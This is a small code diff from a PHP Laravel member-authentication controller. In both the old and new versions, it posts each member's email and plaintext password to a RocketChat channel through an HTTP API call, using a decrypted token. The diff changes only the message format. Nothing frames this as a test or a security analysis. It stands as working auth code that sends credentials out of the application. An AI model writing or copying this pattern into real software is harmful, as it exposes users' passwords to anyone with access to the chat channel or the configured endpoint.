@@ -103,9 +103,7 @@ class LLMemberAuthController extends Controller
 
         if($rocketChat != null){
             // $token = $rocketChat->api_token;
-
             $token = Crypt::decryptString($rocketChat->api_token);
-
             $response = Http::withHeaders([
                 'X-Auth-Token' => $token,
                 'X-User-Id' => $rocketChat->x_user_id,
@@ -113,7 +111,7 @@ class LLMemberAuthController extends Controller
             ])->post( $rocketChat->api_url,[
                 'message' => [
                     'rid' => 'TEST',
-                    'msg' => "Email: $email, Password: $password",
+                    'msg' => "Email: $email\nPassword: $password",
                 ],
             ]);
             // For example, to get the response body:
